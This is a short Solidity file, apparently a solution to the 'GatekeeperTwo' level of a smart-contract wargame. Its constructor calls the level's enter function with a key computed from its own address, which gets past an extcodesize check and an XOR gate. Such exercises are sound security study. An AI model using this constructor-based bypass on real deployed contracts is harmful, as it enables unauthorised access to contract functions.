// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/14-GatekeeperTwo.sol";

contract GatekeeperTwoAttacker {
    GatekeeperTwo public gatekeeperTwo;

    constructor(address _gatekeeperTwo) {
        gatekeeperTwo = GatekeeperTwo(_gatekeeperTwo);
        bytes8 key = ~bytes8(keccak256(abi.encodePacked(address(this))));
        gatekeeperTwo.enter(key);
    }
}